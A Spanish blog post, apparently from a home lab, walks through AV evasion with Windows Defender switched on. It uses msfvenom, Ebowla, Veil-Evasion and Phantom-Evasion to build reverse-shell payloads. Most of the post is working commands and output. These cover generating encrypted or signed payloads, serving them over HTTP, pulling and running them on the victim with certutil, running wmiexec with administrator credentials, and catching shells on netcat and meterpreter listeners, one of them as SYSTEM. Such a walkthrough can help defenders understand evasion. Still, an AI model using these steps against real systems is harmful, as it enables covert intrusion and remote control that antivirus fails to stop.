---
date: 2022-09-06T19:46:05.000Z
layout: post
comments: true
title: Evasión de antivirus
subtitle: 'posibles técnicas'
description: >-
image: >-
  http://imgfz.com/i/7XfeZdC.png
optimized_image: >-
  http://imgfz.com/i/7XfeZdC.png
category: ciberseguridad
tags:
  - evasion
  - msfvenom
  - ebowla
  - veil
  - phantom
  - antivirus
  - defender
  - windows
  - hacking
author: Felipe Canales Cayuqueo
paginate: true
---

Un antivirus está diseñado para prevenir, escanear, detectar y evitar que los archivos y procesos maliciosos se propaguen por un sistema operativo, protegiendo así al sistema para que no se puedan ejecutar sobre este.

Todo este proceso se realiza con Windows Defender activo:

![Defender](/images/defenderon.png)

### MSFvenom

Msfvenom es una instancia de línea de comandos de Metasploit que se utiliza para generar todos los diversos tipos de código de shell que están disponibles en Metasploit. Este mismo contiene opciones para intentar evadir un antivirus. Un caso ejemplar es el siguiente:

```bash
┌──(root㉿kali)-[/AD]
└─ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.1.1.19 LPORT=4646 --encrypt rc4 --encrypt-key -e x64/xor -f exe -o test.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: test.exe
```

```bash
┌──(root㉿kali)-[/AD]
└─ ls -l test.exe
-rw-r--r-- 1 root root 7168 Aug 29 04:35 test.exe
```

```bash
┌──(root㉿kali)-[/AD]
└─ python -m http.server 80                                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
C:\Windows\Temp\test> certutil.exe -f -urlcache -split http://10.1.1.19/test.exe test.exe
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
****  En l�nea  ****

  0000  ...
  1c00
CertUtil: -URLCache comando completado correctamente.

C:\Windows\Temp\test> test.exe

```

```bash
┌──(root㉿kali)-[/AD]
└─ rlwrap nc -nlvp 4646
listening on [any] 4646 ...
connect to [10.1.1.19] from (UNKNOWN) [10.1.1.32] 49993
Microsoft Windows [Versi�n 10.0.19042.1889]
(c) Microsoft Corporation. Todos los derechos reservados.

ipconfig
ipconfig

Configuraci�n IP de Windows


Adaptador de Ethernet Ethernet:

   Sufijo DNS espec�fico para la conexi�n. . : 
   Direcci�n IPv6 . . . . . . . . . . : fd17:625c:f037:2:2556:9357:93e5:7e33
   Direcci�n IPv6 temporal. . . . . . : fd17:625c:f037:2:8dcf:4da7:928a:ee99
   V�nculo: direcci�n IPv6 local. . . : fe80::2556:9357:93e5:7e33%6
   Direcci�n IPv4. . . . . . . . . . . . . . : 10.1.1.32
   M�scara de subred . . . . . . . . . . . . : 255.255.255.0
   Puerta de enlace predeterminada . . . . . : fe80::5054:ff:fe12:3500%6
                                       10.1.1.1

C:\Windows\Temp\test>

```


### Ebowla 

Este es un framework para construir cargas útiles manipuladas y cifradas.

```bash
┌──(root㉿kali)-[/AD]
└─  git clone https://github.com/Genetic-Malware/Ebowla
```

Primero crearemos un payload por medio de msfvenom, el cual ocuparemos para evadir el antivirus.

```bash
┌──(root㉿kali)-[/AD]
└─  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.1.1.19 LPORT=4646 -f exe -o reverse.exe
```

A continuación configuramos los siguiente puntos del ```genetic.config```:

```bash
┌──(root㉿kali)-[/AD/Ebowla]
└─  nano genetic.config

[Overall]

    # Template output: GO, Python, OR PowerShell 

    output_type = GO 

    # type of file being fed (payload) - also determines execution
    # Python: EXE, DLL_x86, DLL_x64 are written to disk
    # GO: Nothing is written to disk
    # OPTIONS for GO: EXE, DLL_x86, DLL_x64, SHELLCODE
    # OPTIONS for PYTHON: EXE, SHELLCODE, CODE, FILE_DROP
    # OPTIONS for PowerShell: CODE, DLL_x86, DLL_x64, EXE, FILE_DROP

    payload_type = EXE 

[symmetric_settings_win]
    # AES-CFB-256 key from a combination of the any of the following settings.
    # Any of the following can be used, the more specific to your target the better.  


    # set the value to '' if you do not want to use that value


    # This is not a permanent list.  Any env variable can be added below.
    # If you want the env variable to be used, give it a value.
    # These are case insensitive.
    
    [[ENV_VAR]]
    
        username = ''
        computername = 'PC-FELIPE'
        homepath = ''
        homedrive = ''
        Number_of_processors = ''
        processor_identifier = ''
        processor_revision = ''
        userdomain = ''
        systemdrive = ''
        userprofile = ''
        path = ''
        temp = ''

```

Luego simplemente procedemos a ejecutar ```ebowla.py``` con python2:

```bash
┌──(root㉿kali)-[/AD/Ebowla]
└─  python2 ebowla.py ../reverse.exe genetic.config
[*] Using Symmetric encryption
[*] Payload length 7168
[*] Payload_type exe
[*] Using EXE payload template
[*] Used environment variables:
	[-] environment value used: computername, value used: pc-felipe
[!] Path string not used as pasrt of key
[!] External IP mask NOT used as part of key
[!] System time mask NOT used as part of key
[*] String used to source the encryption key: pc-felipe
[*] Applying 10000 sha512 hash iterations before encryption
[*] Encryption key: 209b0e1f6acffe989719f5db475e1cddc9ab011784c66f385fd31b2cd5f16e90
[*] Writing GO payload to: go_symmetric_reverse.exe.go

```

Verificamos si el archivo se creó correctamente en la carpeta de output:

```bash
┌──(root㉿kali)-[/AD/Ebowla]
└─ ls output
go_symmetric_reverse.exe.go
```

Y ejecutamos la construcción del binario de salida, que en nuestro caso será bajo la ariqutectura x64, es decir, ```build_x64_go.sh```:

```bash
┌──(root㉿kali)-[/AD/Ebowla]
└─  ./build_x64_go.sh output/go_symmetric_felipe.exe.go reverse_ebowla.exe
[*] Copy Files to tmp for building
[*] Building...
[*] Building complete
[*] Copy reverse_ebowla.exe to output
[*] Cleaning up
[*] Done

```

El resultado se guardará como un ```.exe``` en la carpeta output:

```bash
┌──(root㉿kali)-[/AD/Ebowla]
└─  ls output
reverse_ebowla.exe  go_symmetric_reverse.exe.go
```

Procedemos a realizar la subida del nuestro ejecutable malicioso a la máquina víctima, como buscamos evadir el antivirus se recomienda el uso de ```wmiexec.py```:

```bash
┌──(root㉿kali)-[/AD/Ebowla/output]
└─  python -m http.server 80                                                              
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
┌──(root㉿kali)-[/AD]
└─ wmiexec.py felipecorp.local/administrador:P@\$\$w0rd\!@10.1.1.32
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\> certutil.exe -f -urlcache -split http://10.1.1.19/reverse_ebowla.exe reverse.exe
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
****  En l�nea  ****

  000000  ...
  3a8084
CertUtil: -URLCache comando completado correctamente.

C:\Windows\Temp> dir
 El volumen de la unidad C no tiene etiqueta.
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
 El n�mero de serie del volumen es: 6C26-4A6C


 Directorio de C:\Windows\Temp

28-08-2022  20:42    <DIR>          .
28-08-2022  20:42    <DIR>          ..
28-08-2022  03:40                53 .ses
28-08-2022  03:41                53 af397ef28e484961ba48646a5d38cf54.db.ses
28-08-2022  06:09    <DIR>          DF7A2519-72FC-4275-83CD-5BCDD6E3041C-Sigs
28-08-2022  20:42         3.833.988 reverse.exe
28-08-2022  03:05                 0 FXSAPIDebugLogFile.txt
28-08-2022  03:05                 0 FXSTIFFDebugLogFile.txt
28-08-2022  03:35                 0 mat-debug-1692.log
28-08-2022  03:35                 0 mat-debug-1916.log
28-08-2022  03:41                 0 mat-debug-3992.log
28-08-2022  03:40                 0 mat-debug-4880.log
28-08-2022  03:57             4.868 MpCmdRun.log
28-08-2022  06:09             9.332 MpSigStub.log
28-08-2022  03:39    <DIR>          MsEdgeCrashpad
28-08-2022  03:54            79.826 msedge_installer.log
              12 archivos      3.928.120 bytes
               4 dirs  23.802.892.288 bytes libres
```


Ahora nos ponemos a la escucha por el puerto previamente configurado:

```bash
┌──(root㉿kali)-[/AD/Ebowla]
└─  rlwrap nc -nlvp 4646                                                                                                                               
listening on [any] 4646 ...
```

Y ejecutamos ```reverse.exe```:

```bash
C:\Windows\Temp> reverse.exe  
[*] IV: 93da729da2aa0194bb082131905588c1
[*] Size of encrypted_payload:  9600
[*] Hash of encrypted_payload: e4868bf9b95047a1c1e621542d563460dd9e93e234997c9fed44a681e47cb12bdcd4457f14c37c5f5735290125591c9d69be84f522aecac1b29962bf8836699e
[*] Number of keys: 1
[*] Final key_list: [pc-felipe]
==================================================
[*] Key: pc-felipe
[*] Computed Full Key @ 2710 iterations: 209b0e1f6acffe989719f5db475e1cddc9ab011784c66f385fd31b2cd5f16e905114303fb93d9c00d91cab01cb3050109992b7e0ca0015c0bfdd707f0b8d7f9b
[*] AES Password 209b0e1f6acffe989719f5db475e1cddc9ab011784c66f385fd31b2cd5f16e90
[*] Decoded Payload with Padding: f0b042143e8e613be15809cca58c6a8578c1690cba645a546a74a3be7e48378b784db35f79e9208df7f38bb9685fd91b06961969bfe98ccf8785344a94b4ade8
[*] Message Length: 7168
[*] Message Length w/ Padding: 7168
[*] Test Hash : 10d116a5c97eae2f77f230e2a049e3c39aa1f083ec8f220afa777e62d257f93e6bc2df975dd6940add5c1cf499f64814ec99b58bbef53a07670c80150676a8f4
Search Hash: 10d116a5c97eae2f77f230e2a049e3c39aa1f083ec8f220afa777e62d257f93e6bc2df975dd6940add5c1cf499f64814ec99b58bbef53a07670c80150676a8f4
[*] Hashes Match
Len full_payload: 7168
[*] Key Combinations:  [[pc-felipe]]
```

Una vez terminado el proceso, recibimos en nuestra máquina de atacante una shell, en la cual podemos verificar que corresponde al objetivo:

```bash
┌──(root㉿kali)-[/AD/Ebowla]
└─  rlwrap nc -nlvp 4646                                                                                                                               
listening on [any] 4646 ...
connect to [10.1.1.19] from (UNKNOWN) [10.1.1.32] 61277
Microsoft Windows [Versi�n 10.0.19042.631]
(c) 2020 Microsoft Corporation. Todos los derechos reservados.

whoami
whoami
nt authority\system

ipconfig
ipconfig

Configuraci�n IP de Windows


Adaptador de Ethernet Ethernet:

   Sufijo DNS espec�fico para la conexi�n. . : 
   Direcci�n IPv6 . . . . . . . . . . : fd17:625c:f037:2:2556:9357:93e5:7e33
   Direcci�n IPv6 temporal. . . . . . : fd17:625c:f037:2:582:b14:122a:b0fb
   V�nculo: direcci�n IPv6 local. . . : fe80::2556:9357:93e5:7e33%6
   Direcci�n IPv4. . . . . . . . . . . . . . : 10.1.1.32
   M�scara de subred . . . . . . . . . . . . : 255.255.255.0
   Puerta de enlace predeterminada . . . . . : fe80::5054:ff:fe12:3500%6
                                       10.1.1.1

C:\Windows\Temp>
```

### Veil Evasion

Veil es una herramienta diseñada para generar cargas útiles de metasploit que eluden las soluciones antivirus comunes. Para esto ejemplo utilizaremos un sesión meterpreter de ```metasploit```:

```bash
┌──(root㉿kali)-[/AD]
└─ veil -t Evasion -p go/meterpreter/rev_tcp.py --ip 10.1.1.19 --port 4646
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

runtime/internal/sys
runtime/internal/atomic
runtime
errors
internal/race
sync/atomic
math
unicode/utf8
internal/syscall/windows/sysdll
unicode/utf16
sync
io
syscall
strconv
reflect
encoding/binary
command-line-arguments
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 [*] Language: go
 [*] Payload Module: go/meterpreter/rev_tcp
 [*] Executable written to: /var/lib/veil/output/compiled/payload.exe
 [*] Source code written to: /var/lib/veil/output/source/payload.go
 [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/payload.rc

```

Revisamos si se creó correctamente el archivo ejecutable:

```bash
┌──(root㉿kali)-[/AD]
└─ ls /var/lib/veil/output/compiled/          
payload.exe
```

Por comodidad lo movemos al directorio actual de trabajo:

```bash
┌──(root㉿kali)-[/AD]
└─ mv /var/lib/veil/output/compiled/payload.exe .
```

Nos montamos un servidor con ```python``` para enviar el ejecutable a nuestra máquina víctima:

```bash
┌──(root㉿kali)-[/AD]
└─ python -m http.server 80                                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Y nos pasamos ```payload.exe``` con ```certutil.exe```:

```bash
C:\Windows\Temp\test> certutil.exe -f -urlcache -split http://10.1.1.19/payload.exe payload.exe
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
****  En l�nea  ****

  000000  ...
  0c0600
CertUtil: -URLCache comando completado correctamente.

C:\Windows\Temp\test> payload.exe

```

Nos montamos la sesión con meterpreter:

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload payload/windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.1.1.19        yes       The listen address (an interface may be specified)
   LPORT     4646             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.1.1.19:4646 
```

Y al ejecutarlo nos devolverá una sesión en que podremos ejecutarnos un shell interactiva:

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.1.1.19:4646 
[*] Sending stage (175686 bytes) to 10.1.1.32
[*] Sending stage (175686 bytes) to 10.1.1.32
[*] Meterpreter session 8 opened (10.1.1.19:4646 -> 10.1.1.32:49951) at 2022-09-01 05:14:44 -0400
meterpreter > shell
Process 688 created.
Channel 1 created.
Microsoft Windows [Versi�n 10.0.19042.1889]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Windows\Temp\test>whoami
whoami
felipecorp\fcanales

C:\Windows\Temp\test>ipconfig
ipconfig

Configuraci�n IP de Windows


Adaptador de Ethernet Ethernet:

   Sufijo DNS espec�fico para la conexi�n. . : 
   Direcci�n IPv6 . . . . . . . . . . : fd17:625c:f037:2:2556:9357:93e5:7e33
   Direcci�n IPv6 temporal. . . . . . : fd17:625c:f037:2:94c2:a971:e890:9677
   V�nculo: direcci�n IPv6 local. . . : fe80::2556:9357:93e5:7e33%6
   Direcci�n IPv4. . . . . . . . . . . . . . : 10.1.1.32
   M�scara de subred . . . . . . . . . . . . : 255.255.255.0
   Puerta de enlace predeterminada . . . . . : fe80::5054:ff:fe12:3500%6
                                       10.1.1.1

C:\Windows\Temp\test>
```

### Phantom-Evasion

Phantom-Evasion es una herramienta de evasión antivirus escrita en python (ambos compatibles con python y python3) capaz de generar ejecutables (casi) totalmente indetectables incluso con la carga útil x86 msfvenom más común.

```bash
┌──(root㉿kali)-[/AD]
└─  git clone https://github.com/oddcod3/Phantom-Evasion                 
```

Para evitar errores se debe cambiar de PKCS12Type a PKCS12 en el siguiente ```.py```:

```bash
┌──(root㉿kali)-[/AD/Phantom-Evasion/Setup]
└─  nano Phantom_lib.py
pfx = crypto.PKCS12()      
```

Ahora instalamos osslsigncode

```bash
┌──(root㉿kali)-[/AD/Phantom-Evasion/Setup]
└─  apt -y install osslsigncode    
```

Y ejecutamos:

```bash
                       _                 _                        
                 _ __ | |__   __ _ _ __ | |_ ___  _ __ ___        
                | '_ \| '_ \ / _` | '_ \| __/ _ \| '_ ` _ \       
                | |_) | | | | (_| | | | | || (_) | | | | | |      
                | .__/|_| |_|\__,_|_| |_|\__\___/|_| |_| |_|      
                |_|   / _ \ \ / / _` / __| |/ _ \| '_ \           
                     |  __/\ V / (_| \__ \ | (_) | | | |          
                      \___| \_/ \__,_|___/_|\___/|_| |_|          
                                                        v3.0      

    =====================================================================
  ||        [MAIN MENU]:             ||                                  || 
  ||                                 ||                                  || 
  ||    [1]  Windows modules         ||   [5]  Priv-Esc modules          || 
  ||                                 ||                                  || 
  ||    [2]  Linux modules           ||   [6]  Post-Ex modules           || 
  ||                                 ||                                  || 
  ||    [3]  Android modules         ||   [7]  Setup                     || 
  ||                                 ||                                  || 
  ||    [4]  Persistence modules     ||   [0]  Exit                      || 
  ||                                 ||                                  || 
    =====================================================================

[>] Please insert option: 1

```

```bash
---------------------------------------------------------------------------
[+] WINDOWS MODULES:
---------------------------------------------------------------------------

[1]  Windows Shellcode Injection                 (C)

[2]  Windows Reverse Tcp Stager                  (C)

[3]  Windows Reverse Http Stager                 (C)

[4]  Windows Reverse Https Stager                (C)

[5]  Windows Download Execute Exe NoDiskWrite    (C)

[6]  Windows Download Execute Dll NoDiskWrite    (C)

[0]  Back                                                                

[>] Insert payload number: 1
```

```bash
[+] MODULE DESCRIPTION:

  Inject and execute shellcode 
  [>] Local process shellcode execution type:
   > Thread                            
   > APC                               

  [>] Remote process shellcode execution type:
   > ThreadExecutionHijack       (TEH) 
   > Processinject               (PI)  
   > APCSpray                    (APCS)
   > EarlyBird                   (EB) 
   > EntryPointHijack            (EPH)

  [>] Local Memory allocation type:
   > Virtual_RWX                     
   > Virtual_RW/RX                   
   > Virtual_RW/RWX                  
   > Heap_RWX                        

  [>] Remote Memory allocation type:
   > Virtual_RWX                     
   > Virtual_RW/RX                   
   > Virtual_RW/RWX                  
   > SharedSection                   

  [>] Shellcode Encryption supported 
  [>] Shellcode can be embedded as resource
  [>] AUTOCOMPILE format: exe,dll 


  Press Enter to continue: 

[>] Insert Target architecture (default:x86):x64

[>] Insert shell generation method (default: msfvenom):

[>] Embed shellcode as PE resource? (Y/n): Y

[>] Insert msfvenom payload (default: windows/x64/meterpreter/reverse_tcp):windows/x64/shell_reverse_tcp

[>] Insert LHOST: 10.1.1.19

[>] Insert LPORT: 4646

[>] Custom msfvenom options(default: empty): 

[>] Payload encryption

[1] none                

[2] Xor                 

[3] Double-key Xor      

[4] Vigenere            

[5] Double-key Vigenere 


[>] Select encoding option: 3

[>] Insert Exec-method (default:Thread):

[>] Insert Memory allocation type (default:Virtual_RWX):Heap_RWX

[>] Insert Junkcode Intesity value (default:10):

[>] Insert Junkcode Frequency value  (default: 10):

[>] Insert Junkcode Reinjection Frequency (default: 0):

[>] Insert Evasioncode Frequency value  (default: 10):

[>] Dynamically load windows API? (Y/n):

[>] Add Ntdll api Unhooker? (Y/n):

[>] Masq peb process? (Y/n):

[>] Insert fake process path?(default:C:\windows\system32\notepad.exe):

[>] Insert fake process commandline?(default:empty):

[>] Strip executable? (Y/n):

[>] Use certificate spoofer and sign executable? (Y/n):

[>] Insert url target for certificate spoofer (default:www.windows.com:443):

[>] Insert certificate description (default:Notepad Benchmark Util):

[>] Insert output format (default:exe):           

[>] Insert output filename:example.exe

[>] Generating code...

No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of c file: 1957 bytes
[>] Double-key Xor encryption...


[>] Compiling...


[>] Strip binary...


[>] Sign Executable 


[>] Signing example.exe with osslsigncode...

[>] Succeeded


[<>] File saved in Phantom-Evasion folder

```

Una vez terminado, revisamos el ejecutable.

```bash
┌──(root㉿kali)-[/AD/Phantom-Evasion]
└─ ls
example.exe  LICENSE  Modules  osslsigncode  phantom-evasion.py  README.md  Setup
```

Y como podemos ver este al momento de subirse a la máquina objetivo, estando el Windows Defender habilitado, este último no lo borra:

![phantomexample](/images/example.exe.png)
